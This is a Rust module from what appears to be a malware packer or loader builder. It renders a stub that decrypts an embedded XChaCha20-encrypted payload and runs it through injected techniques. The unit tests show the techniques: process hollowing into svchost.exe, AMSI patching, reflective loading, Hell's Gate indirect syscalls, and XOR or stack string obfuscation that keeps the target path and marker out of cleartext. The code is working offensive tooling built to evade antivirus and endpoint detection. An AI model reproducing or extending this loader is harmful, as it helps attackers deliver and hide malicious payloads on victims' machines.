//! Stub rendering from a template.
//!
//! Two template sources are supported:
//!
//! - The **builtin** template (`templates/stub/main.rs.tpl`), used when the
//!   YAML's `build.stub.path` is null or absent. It decrypts and runs the
//!   payload through the active techniques.
//! - A **custom** loader stub (a user-supplied `.rs` template referenced by
//!   `build.stub.path`). It gets the same placeholders but is free to ignore the
//!   preparation/execution blocks; the packer only requires it to define a
//!   `fn main()`.
//!
//! Both are rendered by the same substitution engine: every `$PLACEHOLDER$`
//! token in the template is replaced with a value built from [`StubParams`],
//! the technique [`RuntimeStep`]s and the [`StringsConfig`]. A token that is
//! not a known placeholder (or a provided build arg) is an error, to catch
//! stale templates.

use std::collections::BTreeMap;
use std::sync::OnceLock;

use rand::RngCore;
use regex::Regex;

use super::args::{self, ArgsMode};
use super::obfuscation::{byte_array_literal, StringsConfig};
use super::syscalls::{self, SyscallsConfig, SyscallsMode};
use super::{imports, BuildError, Result};
use crate::techniques::{Category, RuntimeStep};

/// Values used to fill the template placeholders.
pub struct StubParams {
    /// XChaCha20 nonce (24 bytes), for `$NONCE_HEX$` / `$PAYLOAD_NONCE_DEF$`.
    pub nonce: [u8; 24],
    /// Symmetric key (32 bytes), for `$KEY_HEX$` / `$PAYLOAD_KEY_DEF$`.
    pub key: [u8; 32],
    /// Encrypted payload (ciphertext + tag), for `$PAYLOAD_BYTES$`.
    pub ciphertext: Vec<u8>,
    /// Original payload size, for `$PLAINTEXT_LEN$` / `$PAYLOAD_LEN$`.
    pub plaintext_len: usize,
    /// Per-build unique marker (e.g. `STUB_MARKER_<hex>`).
    pub stub_marker: String,
    /// Path to `payload.bin` for `include_bytes!` (relative to the stub).
    pub payload_path: String,
    /// Positional build args, exposed to the template as `$ARG_<index>$`.
    pub build_args: BTreeMap<String, String>,
    /// Fixed payload arguments from `build.payload.args`.
    pub payload_args: Vec<String>,
    /// How [`StubParams::payload_args`] combine with the packed binary's runtime
    /// args (`build.payload.args_mode`).
    pub args_mode: ArgsMode,
}

/// The result of rendering a custom loader stub.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RenderedStub {
    /// The substituted Rust source.
    pub source: String,
    /// Non-fatal warnings (e.g. the stub ignores the technique blocks).
    pub warnings: Vec<String>,
}

/// Placeholders the builtin template is required to contain (its contract).
///
/// A missing one means the builtin template is stale, so we fail loudly rather
/// than emit a stub that will not compile or that silently does nothing.
const BUILTIN_REQUIRED: &[&str] = &[
    "$NONCE_HEX$",
    "$KEY_HEX$",
    "$PLAINTEXT_LEN$",
    "$STUB_MARKER_DEF$",
    "$PAYLOAD_PATH$",
    "$PREPARATION_BLOCKS$",
    "$SYSCALLS_BLOCK$",
    "$ARGS_BLOCK$",
    "$IMPORTS_BLOCK$",
    "$EXECUTION_BLOCK$",
];

/// Generates a per-build unique marker: `STUB_MARKER_<16 hex>`.
pub fn generate_stub_marker() -> String {
    let mut bytes = [0u8; 8];
    rand::thread_rng().fill_bytes(&mut bytes);
    format!("STUB_MARKER_{}", hex::encode(bytes))
}

/// Renders the builtin stub template, substituting every placeholder with
/// `params`, injecting the active techniques' fragments (`pipeline`) into
/// `$PREPARATION_BLOCKS$` (Preparation techniques, in order),
/// `$EXECUTION_BLOCK$` (the single Execution technique), the syscall layer
/// (`syscalls`) into `$SYSCALLS_BLOCK$` and the shared import resolver into
/// `$IMPORTS_BLOCK$`.
///
/// Returns an error if a required placeholder is missing from the template or
/// if any `$...$` is left unsubstituted.
pub fn render_main_rs(
    template: &str,
    params: &StubParams,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
    syscalls: &SyscallsConfig,
) -> Result<String> {
    for required in BUILTIN_REQUIRED {
        if !template.contains(required) {
            return Err(BuildError::InvalidTemplate(format!(
                "placeholder '{required}' does not appear in the template"
            )));
        }
    }
    render_common(template, params, pipeline, strings, syscalls)
}

/// Renders a custom loader stub template.
///
/// Unlike the builtin, the template may omit any placeholder; the only hard
/// requirement (enforced separately by [`validate_custom_stub_template`]) is a
/// `fn main()`. When the template ignores the technique blocks while the YAML
/// declares techniques, a non-fatal warning is returned for each ignored block.
pub fn render_custom_stub(
    template: &str,
    params: &StubParams,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
    syscalls: &SyscallsConfig,
) -> Result<RenderedStub> {
    let mut warnings = Vec::new();
    if has_preparation(pipeline) && !template.contains("$PREPARATION_BLOCKS$") {
        warnings.push(
            "loader stub does not reference $PREPARATION_BLOCKS$; declared \
             preparation techniques will have no effect"
                .to_string(),
        );
    }
    if has_execution(pipeline) && !template.contains("$EXECUTION_BLOCK$") {
        warnings.push(
            "loader stub does not reference $EXECUTION_BLOCK$; the payload \
             will not be executed"
                .to_string(),
        );
    }
    if syscalls.mode == SyscallsMode::Indirect
        && !syscalls::required(pipeline).is_empty()
        && !template.contains("$SYSCALLS_BLOCK$")
    {
        warnings.push(
            "loader stub does not reference $SYSCALLS_BLOCK$; the declared \
             techniques' nt_* calls will fail to compile"
                .to_string(),
        );
    }
    if imports::needed(pipeline) && !template.contains("$IMPORTS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $IMPORTS_BLOCK$; the declared \
             techniques' payload imports will not be resolved"
                .to_string(),
        );
    }
    if args::needed(pipeline) && !template.contains("$ARGS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $ARGS_BLOCK$; the declared \
             techniques' payload command line will not be built"
                .to_string(),
        );
    }

    let source = render_common(template, params, pipeline, strings, syscalls)?;
    Ok(RenderedStub { source, warnings })
}

/// Validates a custom loader stub before compilation: it must define a
/// `fn main()`. The check is deliberately simple (`fn\s+main\s*\(`) and does not
/// attempt to parse Rust.
pub fn validate_custom_stub_template(template: &str) -> Result<()> {
    static MAIN_RE: OnceLock<Regex> = OnceLock::new();
    let re = MAIN_RE.get_or_init(|| Regex::new(r"fn\s+main\s*\(").expect("static regex"));
    if !re.is_match(template) {
        return Err(BuildError::InvalidTemplate(
            "loader stub must define a `fn main()`".to_string(),
        ));
    }
    Ok(())
}

/// Renders any template by substituting every known placeholder token.
fn render_common(
    template: &str,
    params: &StubParams,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
    syscalls: &SyscallsConfig,
) -> Result<String> {
    let values = placeholder_values(template, params, pipeline, strings, syscalls);
    substitute_template(template, &values)
}

/// Builds the `$PLACEHOLDER$` → value map for a template.
///
/// The expensive `$PAYLOAD_BYTES$` array literal is only built when the
/// template actually references it (the builtin uses `include_bytes!` instead).
fn placeholder_values(
    template: &str,
    params: &StubParams,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
    syscalls: &SyscallsConfig,
) -> BTreeMap<String, String> {
    let (preparation_blocks, execution_block) = render_blocks(pipeline, strings);
    let stub_marker_def = strings
        .obfuscate(&params.stub_marker)
        .render_stub_expr("stub_marker");

    let mut values = BTreeMap::new();
    values.insert("$NONCE_HEX$".to_string(), hex::encode(params.nonce));
    values.insert("$KEY_HEX$".to_string(), hex::encode(params.key));
    values.insert(
        "$PLAINTEXT_LEN$".to_string(),
        params.plaintext_len.to_string(),
    );
    values.insert(
        "$PAYLOAD_LEN$".to_string(),
        params.plaintext_len.to_string(),
    );
    values.insert("$STUB_MARKER_DEF$".to_string(), stub_marker_def);
    values.insert("$PAYLOAD_PATH$".to_string(), params.payload_path.clone());
    values.insert(
        "$PAYLOAD_NONCE_DEF$".to_string(),
        byte_array_literal(&params.nonce),
    );
    values.insert(
        "$PAYLOAD_KEY_DEF$".to_string(),
        byte_array_literal(&params.key),
    );
    values.insert("$PREPARATION_BLOCKS$".to_string(), preparation_blocks);
    values.insert(
        "$SYSCALLS_BLOCK$".to_string(),
        syscalls::render_block(syscalls, pipeline, strings),
    );
    values.insert(
        "$ARGS_BLOCK$".to_string(),
        args::render_block(&params.payload_args, params.args_mode, pipeline, strings),
    );
    values.insert(
        "$IMPORTS_BLOCK$".to_string(),
        imports::render_block(pipeline, strings),
    );
    values.insert("$EXECUTION_BLOCK$".to_string(), execution_block);
    if template.contains("$PAYLOAD_BYTES$") {
        values.insert(
            "$PAYLOAD_BYTES$".to_string(),
            byte_array_literal(&params.ciphertext),
        );
    }
    for (name, value) in &params.build_args {
        values.insert(format!("$ARG_{name}$"), value.clone());
    }
    values
}

/// Renders the technique blocks: Preparation fragments (each wrapped in a
/// module, plus a `run_preparations` dispatcher) and the Execution fragment.
fn render_blocks(pipeline: &[RuntimeStep], strings: &StringsConfig) -> (String, String) {
    let mut preparation_blocks = String::new();
    let mut preparation_calls = String::new();
    let mut execution_block = String::new();

    for step in pipeline {
        let fragment = step.render_fragment(strings);
        match step.category() {
            Category::Preparation => {
                // Wrap each Preparation fragment in its own module so their
                // `use` statements do not collide with each other or with the
                // Execution fragment (all are injected into the same file).
                let module = format!("technique_{}", step.name());
                preparation_blocks.push_str(&format!("mod {module} {{\n"));
                preparation_blocks.push_str(&fragment);
                preparation_blocks.push_str("\n}\n\n");
                // A preparation returning `false` aborts the pipeline before
                // the payload runs (see the contract in `techniques/README.md`).
                preparation_calls.push_str(&format!(
                    "    if !{module}::{}().map_err(|e| e.to_string())? {{\n        return Ok(false);\n    }}\n",
                    step.name()
                ));
            }
            Category::Execution => {
                execution_block.push_str(&fragment);
                execution_block.push('\n');
            }
        }
    }

    // The dispatcher is always emitted (an empty body when there are no
    // Preparation techniques) so the template can call it unconditionally. It
    // returns `false` when a preparation asked to abort the pipeline.
    preparation_blocks.push_str("fn run_preparations() -> Result<bool, String> {\n");
    preparation_blocks.push_str(&preparation_calls);
    preparation_blocks.push_str("    Ok(true)\n}\n");

    (preparation_blocks, execution_block)
}

/// Substitutes every `$NAME$` token in `template`, looking each one up in
/// `values`. An unknown token is an error, and the legacy `{{NAME}}` delimiters
/// are rejected with a migration hint.
///
/// A `$` that is not part of a `$NAME$` token (e.g. inside a string literal or a
/// macro body) is kept literally.
fn substitute_template(template: &str, values: &BTreeMap<String, String>) -> Result<String> {
    if let Some(legacy) = find_legacy_placeholder(template) {
        return Err(BuildError::InvalidTemplate(format!(
            "placeholder '{legacy}' uses the old `{{{{...}}}}` syntax; use `$...$` instead (e.g. `$PAYLOAD_BYTES$`)"
        )));
    }

    let mut out = String::with_capacity(template.len());
    let mut rest = template;

    while let Some(start) = rest.find('$') {
        // A placeholder is `$NAME$`; any other `$` is kept literally.
        let after_open = &rest[start + 1..];
        if let Some(end) = after_open.find('$') {
            if is_placeholder_name(&after_open[..end]) {
                let full = &rest[start..start + 1 + end + 1];
                let value = values.get(full).ok_or_else(|| {
                    BuildError::InvalidTemplate(format!(
                        "the template contains an unsubstituted placeholder: '{full}'"
                    ))
                })?;
                out.push_str(&rest[..start]);
                out.push_str(value);
                rest = &after_open[end + 1..];
                continue;
            }
        }
        out.push_str(&rest[..start + 1]);
        rest = &rest[start + 1..];
    }

    out.push_str(rest);
    Ok(out)
}

/// Whether `name` may sit between the `$...$` delimiters. Dots are allowed for
/// the YAML `$arg.N$` tokens.
fn is_placeholder_name(name: &str) -> bool {
    !name.is_empty()
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'.')
}

/// Returns the first legacy `{{NAME}}` token in `s`, if any, for the migration
/// error message.
fn find_legacy_placeholder(s: &str) -> Option<&str> {
    let start = s.find("{{")?;
    let end = s[start + 2..].find("}}")?;
    Some(&s[start..start + 2 + end + 2])
}

/// Whether the pipeline declares at least one Preparation technique.
fn has_preparation(pipeline: &[RuntimeStep]) -> bool {
    pipeline
        .iter()
        .any(|step| step.category() == Category::Preparation)
}

/// Whether the pipeline declares at least one Execution technique.
fn has_execution(pipeline: &[RuntimeStep]) -> bool {
    pipeline
        .iter()
        .any(|step| step.category() == Category::Execution)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};
    use crate::engine::syscalls::{Resolver, SyscallsMode};
    use crate::techniques::process_hollowing::Params;

    /// Minimal template with every builtin placeholder.
    ///
    /// Deliberately does *not* define `dec_xor` (the real template does), so
    /// that the strategy tests below can assert on the substituted fragment
    /// alone: xor emits a `dec_xor` call, stack emits none.
    const TEMPLATE: &str = r#"
const NONCE_HEX: &str = "$NONCE_HEX$";
const KEY_HEX: &str = "$KEY_HEX$";
const PLAINTEXT_LEN: usize = $PLAINTEXT_LEN$;
static PAYLOAD_ENC: &[u8] = include_bytes!("$PAYLOAD_PATH$");
fn run() {
    let stub_marker = $STUB_MARKER_DEF$;
}
$PREPARATION_BLOCKS$
$SYSCALLS_BLOCK$
$ARGS_BLOCK$
$IMPORTS_BLOCK$
$EXECUTION_BLOCK$
"#;

    fn params() -> StubParams {
        StubParams {
            nonce: [0u8; 24],
            key: [0x11u8; 32],
            ciphertext: vec![],
            plaintext_len: 1234,
            stub_marker: "STUB_MARKER_deadbeef".to_string(),
            payload_path: "payload.bin".to_string(),
            build_args: BTreeMap::new(),
            payload_args: Vec::new(),
            args_mode: ArgsMode::Join,
        }
    }

    fn pipeline() -> Vec<RuntimeStep> {
        vec![RuntimeStep::ProcessHollowing {
            params: Params {
                target: r"C:\Windows\System32\svchost.exe".to_string(),
            },
        }]
    }

    fn xor_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn stack_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        }
    }

    fn default_syscalls() -> SyscallsConfig {
        SyscallsConfig::default()
    }

    #[test]
    fn substitutes_all_placeholders() {
        let out = render_main_rs(TEMPLATE, &params(), &[], &xor_config(), &default_syscalls())
            .expect("should render without error");

        assert!(!out.contains('$'), "no placeholders should remain: {out}");
        assert!(out.contains(&"00".repeat(24)), "nonce not substituted");
        assert!(out.contains(&"11".repeat(32)), "key not substituted");
        assert!(out.contains("1234"), "plaintext_len not substituted");
        assert!(out.contains("payload.bin"), "payload_path not substituted");
        // Sensitive strings must not appear in cleartext.
        assert!(!out.contains("STUB_MARKER_deadbeef"));
    }

    #[test]
    fn marker_and_target_defs_are_emitted() {
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render with a technique");

        // Both definitions must be emitted and the placeholders gone.
        assert!(
            out.contains("let stub_marker = crate::dec_xor"),
            "marker def not emitted: {out}"
        );
        assert!(
            out.contains("let hollow_target = crate::dec_xor"),
            "target def not emitted: {out}"
        );
        assert!(
            !out.contains("$HOLLOW_TARGET_DEF$"),
            "target placeholder not substituted"
        );
        assert!(out.contains("fn run_stage_two"), "fragment not injected");
    }

    #[test]
    fn preparation_and_execution_blocks_are_both_emitted() {
        let pipeline = vec![
            RuntimeStep::PatchAmsi {
                params: crate::techniques::patch_amsi::Params {},
            },
            RuntimeStep::ReflectiveLoading {
                params: crate::techniques::reflective_loading::Params {},
            },
        ];
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline,
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render with preparation + execution");

        assert!(
            out.contains("fn patch_amsi"),
            "preparation fragment missing: {out}"
        );
        assert!(
            out.contains("mod technique_patch_amsi"),
            "preparation fragment not namespaced: {out}"
        );
        assert!(
            out.contains("fn run_preparations"),
            "preparation dispatcher missing: {out}"
        );
        assert!(
            out.contains("technique_patch_amsi::patch_amsi().map_err(|e| e.to_string())?"),
            "preparation call missing: {out}"
        );
        assert!(
            out.contains("fn run_reflective"),
            "execution fragment missing: {out}"
        );
        assert!(
            out.contains("fn execute_payload"),
            "execution adapter missing: {out}"
        );
    }

    #[test]
    fn xor_fragment_contains_dec_xor() {
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        assert!(out.contains("dec_xor"), "xor fragment must call dec_xor");
    }

    #[test]
    fn stack_fragment_avoids_dec_xor_and_cleartext() {
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &stack_config(),
            &default_syscalls(),
        )
        .expect("should render");

        // No decoder, and neither sensitive string may appear in cleartext.
        assert!(
            !out.contains("dec_xor"),
            "stack must not emit dec_xor: {out}"
        );
        assert!(
            !out.contains("STUB_MARKER_deadbeef"),
            "marker leaked: {out}"
        );
        assert!(
            !out.contains(r"C:\Windows\System32\svchost.exe"),
            "target leaked: {out}"
        );
    }

    /// The `build.stub.strings` YAML block reaches the technique fragments: a
    /// `stack` strategy leaves no decoder and no cleartext target.
    #[test]
    fn strings_block_strategy_reaches_the_fragments() {
        let yaml = crate::engine::obfuscation::YamlStringsConfig {
            strategy: "stack".to_string(),
            key: "random".to_string(),
        };
        let strings = StringsConfig::from_yaml(Some(&yaml)).expect("stack config");
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &strings,
            &default_syscalls(),
        )
        .expect("should render");

        assert!(
            !out.contains("dec_xor"),
            "stack must not emit dec_xor: {out}"
        );
        assert!(
            !out.contains(r"C:\Windows\System32\svchost.exe"),
            "target leaked: {out}"
        );
    }

    #[test]
    fn missing_placeholder_is_an_error() {
        let tpl = TEMPLATE.replace("$KEY_HEX$", "already-substituted");
        let err = render_main_rs(&tpl, &params(), &[], &xor_config(), &default_syscalls())
            .expect_err("should fail");
        let msg = err.to_string();
        assert!(msg.contains("KEY_HEX"), "unclear error message: {msg}");
    }

    #[test]
    fn unknown_placeholder_is_an_error() {
        let tpl = TEMPLATE.to_string() + "\nconst EXTRA: &str = \"$UNKNOWN$\";\n";
        let err = render_main_rs(&tpl, &params(), &[], &xor_config(), &default_syscalls())
            .expect_err("should fail");
        let msg = err.to_string();
        assert!(msg.contains("UNKNOWN"), "unclear error message: {msg}");
    }

    #[test]
    fn legacy_brace_placeholder_is_rejected_with_a_hint() {
        // Concatenate (do not `format!`) so the braces stay literal.
        let tpl = TEMPLATE.to_string() + "\nconst EXTRA: &str = \"{{UNKNOWN}}\";\n";
        let err = render_main_rs(&tpl, &params(), &[], &xor_config(), &default_syscalls())
            .expect_err("should fail");
        let msg = err.to_string();
        assert!(msg.contains("{{UNKNOWN}}"), "unclear error: {msg}");
        assert!(
            msg.contains("$...$"),
            "the error should point at the new syntax: {msg}"
        );
    }

    // --- custom loader stubs ---

    fn custom_params() -> StubParams {
        StubParams {
            nonce: [0xABu8; 24],
            key: [0xCDu8; 32],
            ciphertext: vec![0x01, 0x02, 0x03],
            plaintext_len: 7,
            stub_marker: "STUB_MARKER_custom".to_string(),
            payload_path: "payload.bin".to_string(),
            build_args: BTreeMap::from([
                ("0".to_string(), "abc".to_string()),
                ("name".to_string(), "value".to_string()),
            ]),
            payload_args: Vec::new(),
            args_mode: ArgsMode::Join,
        }
    }

    #[test]
    fn custom_stub_substitutes_payload_bytes_and_len() {
        let template = r#"fn main() { let p = $PAYLOAD_BYTES$; let l = $PAYLOAD_LEN$; }"#;
        let rendered = render_custom_stub(
            template,
            &custom_params(),
            &[],
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        let src = rendered.source;

        assert!(
            src.contains("[0x01, 0x02, 0x03]"),
            "payload bytes not substituted: {src}"
        );
        assert!(
            src.contains("let l = 7"),
            "payload len not substituted: {src}"
        );
        assert!(!src.contains('$'), "no placeholders should remain: {src}");
    }

    #[test]
    fn custom_stub_ignoring_preparation_blocks_warns() {
        // The stub ignores both technique blocks; patch_amsi is Preparation.
        let template = "fn main() {}\n";
        let pipeline = vec![
            RuntimeStep::PatchAmsi {
                params: crate::techniques::patch_amsi::Params {},
            },
            RuntimeStep::ReflectiveLoading {
                params: crate::techniques::reflective_loading::Params {},
            },
        ];
        let rendered = render_custom_stub(
            template,
            &custom_params(),
            &pipeline,
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");

        assert_eq!(rendered.source, template, "no placeholders to substitute");
        assert!(
            rendered
                .warnings
                .iter()
                .any(|w| w.contains("PREPARATION_BLOCKS")),
            "expected a preparation-block warning: {:?}",
            rendered.warnings
        );
    }

    #[test]
    fn custom_stub_substitutes_arg_placeholders() {
        let template = "fn main() { let a = $ARG_0$; let b = $ARG_name$; }";
        let rendered = render_custom_stub(
            template,
            &custom_params(),
            &[],
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        let src = rendered.source;

        assert!(
            src.contains("let a = abc"),
            "positional arg not substituted: {src}"
        );
        assert!(
            src.contains("let b = value"),
            "named arg not substituted: {src}"
        );
        assert!(
            !src.contains("$ARG_"),
            "arg placeholders should be gone: {src}"
        );
    }

    #[test]
    fn validate_custom_stub_requires_fn_main() {
        assert!(validate_custom_stub_template("fn main() {}\n").is_ok());
        assert!(validate_custom_stub_template("fn  main  ( ) {}\n").is_ok());

        let err = validate_custom_stub_template("fn not_main() {}\n").expect_err("should fail");
        assert!(err.to_string().contains("fn main"), "unclear error: {err}");
    }

    // --- syscall layer integration with the template ---

    fn indirect_syscalls() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::HellsGate,
        }
    }

    #[test]
    fn indirect_syscalls_block_is_injected() {
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &xor_config(),
            &indirect_syscalls(),
        )
        .expect("should render");
        assert!(out.contains("mod syscalls"), "syscalls block missing");
        assert!(out.contains("fn init_syscalls"), "init missing");
        assert!(!out.contains("$SYSCALLS_BLOCK$"), "placeholder left behind");
    }

    #[test]
    fn none_syscalls_block_uses_direct_calls() {
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        assert!(out.contains("VirtualAllocEx"), "direct call missing");
        assert!(!out.contains("global_asm"), "no trampoline in none mode");
    }

    #[test]
    fn custom_stub_ignoring_syscalls_block_warns_in_indirect_mode() {
        let template = "fn main() {}\n";
        let rendered = render_custom_stub(
            template,
            &custom_params(),
            &pipeline(),
            &xor_config(),
            &indirect_syscalls(),
        )
        .expect("should render");
        assert!(
            rendered
                .warnings
                .iter()
                .any(|w| w.contains("SYSCALLS_BLOCK")),
            "expected a syscalls-block warning: {:?}",
            rendered.warnings
        );
    }

    #[test]
    fn imports_block_is_injected_for_an_execution_technique() {
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        assert!(out.contains("mod imports"), "resolver module missing");
        assert!(
            out.contains("pub fn resolve_imports"),
            "resolver function missing"
        );
    }

    #[test]
    fn imports_block_is_empty_without_an_execution_technique() {
        let out = render_main_rs(TEMPLATE, &params(), &[], &xor_config(), &default_syscalls())
            .expect("should render");
        assert!(
            !out.contains("pub fn resolve_imports"),
            "resolver leaked into a pipeline that does not need it"
        );
    }

    #[test]
    fn custom_stub_ignoring_imports_block_warns() {
        let template = "fn main() {}\n";
        let rendered = render_custom_stub(
            template,
            &custom_params(),
            &pipeline(),
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        assert!(
            rendered
                .warnings
                .iter()
                .any(|w| w.contains("IMPORTS_BLOCK")),
            "expected an imports-block warning: {:?}",
            rendered.warnings
        );
    }

    // --- payload argument helpers ---

    #[test]
    fn args_block_is_injected_for_an_execution_technique() {
        let out = render_main_rs(
            TEMPLATE,
            &params(),
            &pipeline(),
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        assert!(out.contains("mod payload_args"), "args block missing");
        assert!(
            out.contains("pub fn build_command_line"),
            "command-line builder missing"
        );
        assert!(!out.contains("$ARGS_BLOCK$"), "placeholder left behind");
    }

    #[test]
    fn args_block_is_empty_without_an_execution_technique() {
        let out = render_main_rs(TEMPLATE, &params(), &[], &xor_config(), &default_syscalls())
            .expect("should render");
        assert!(
            !out.contains("pub fn build_command_line"),
            "args block leaked into a pipeline that does not need it"
        );
    }

    #[test]
    fn custom_stub_ignoring_args_block_warns() {
        let template = "fn main() {}\n";
        let rendered = render_custom_stub(
            template,
            &custom_params(),
            &pipeline(),
            &xor_config(),
            &default_syscalls(),
        )
        .expect("should render");
        assert!(
            rendered.warnings.iter().any(|w| w.contains("ARGS_BLOCK")),
            "expected an args-block warning: {:?}",
            rendered.warnings
        );
    }
}
